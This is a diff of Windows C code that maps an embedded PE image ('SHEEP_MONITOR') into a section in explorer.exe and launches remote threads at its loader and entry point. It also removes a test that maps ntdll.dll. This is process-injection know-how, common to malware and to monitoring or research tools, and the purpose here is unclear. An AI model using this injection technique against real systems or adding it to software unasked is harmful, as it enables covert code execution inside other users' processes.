@@ -127,43 +127,6 @@ DWORD get_export_rva(uint8_t *image_base, const char *export_name) {
 
    return 0;
 }
-
-void test_mapping(void) {
-   HANDLE ntdll_handle = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
-                                     GENERIC_READ,
-                                     FILE_SHARE_READ,
-                                     NULL,
-                                     OPEN_EXISTING,
-                                     FILE_ATTRIBUTE_NORMAL,
-                                     NULL);
-   assert(ntdll_handle != INVALID_HANDLE_VALUE);
-
-   HANDLE ntdll_section;
-   assert(NtCreateSection(&ntdll_section,
-                          SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_EXECUTE,
-                          NULL,
-                          NULL,
-                          PAGE_READONLY,
-                          SEC_IMAGE,
-                          ntdll_handle) == STATUS_SUCCESS);
-   CloseHandle(ntdll_handle);
-
-   PVOID base_address = 0;
-   SIZE_T size = 0;
-   DWORD ntstatus = NtMapViewOfSection(ntdll_section,
-                                       GetCurrentProcess(),
-                                       &base_address,
-                                       NULL,
-                                       NULL,
-                                       NULL,
-                                       &size,
-                                       ViewShare,
-                                       MEM_DIFFERENT_IMAGE_BASE_OK,
-                                       PAGE_EXECUTE_WRITECOPY);
-   assert(ntstatus == STATUS_SUCCESS || ntstatus == STATUS_IMAGE_AT_DIFFERENT_BASE);
-   
-   CloseHandle(ntdll_section);
-}
  
 int main(int argc, char *argv[]) {
    DWORD proc_array_bytes = sizeof(DWORD) * 1024;
@@ -212,9 +175,8 @@ int main(int argc, char *argv[]) {
 
    PIMAGE_NT_HEADERS64 sheep_nt = get_nt_headers(&SHEEP_MONITOR[0]);
    HANDLE sheep_section;
-   uintptr_t sheep_alloc = create_sheep_section(explorer_proc, &sheep_section);
-   PVOID remote_sheep_base = NULL;
-   ULONG remote_sheep_size = 0;
+   uintptr_t remote_sheep_base = create_sheep_section(explorer_proc, &sheep_section);
+   size_t remote_sheep_size = sheep_nt->OptionalHeader.SizeOfImage;
 
    SheepConfig config;
    memset(&config, 0, sizeof(SheepConfig));
@@ -233,7 +195,7 @@ int main(int argc, char *argv[]) {
    HANDLE remote_thread_handle = CreateRemoteThread(explorer_proc,
                                                     NULL,
                                                     8192,
-                                                    (LPTHREAD_START_ROUTINE)((uintptr_t)remote_sheep_base+loader_rva),
+                                                    (LPTHREAD_START_ROUTINE)(remote_sheep_base+loader_rva),
                                                     (LPVOID)config_base,
                                                     0,
                                                     &loader_id);
@@ -243,7 +205,7 @@ int main(int argc, char *argv[]) {
    HANDLE main_handle = CreateRemoteThread(explorer_proc,
                                            NULL,
                                            8192,
-                                           (LPTHREAD_START_ROUTINE)((uintptr_t)remote_sheep_base+sheep_nt->OptionalHeader.AddressOfEntryPoint),
+                                           (LPTHREAD_START_ROUTINE)(remote_sheep_base+sheep_nt->OptionalHeader.AddressOfEntryPoint),
                                            NULL,
                                            0,
                                            &main_id);
